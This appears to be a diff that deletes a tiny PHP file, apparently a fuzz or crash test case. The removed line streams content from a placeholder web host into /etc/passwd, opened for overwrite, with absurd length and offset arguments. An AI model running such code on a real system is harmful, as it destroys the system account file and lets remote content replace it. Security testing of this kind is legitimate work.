@@ -1,4 +1,0 @@
-<?php
-stream_copy_to_stream(fopen("https://www.example.com", "r"), fopen("/etc/passwd", "w+"), 5473817451, 2.23431234213480e-400);
-
-?>
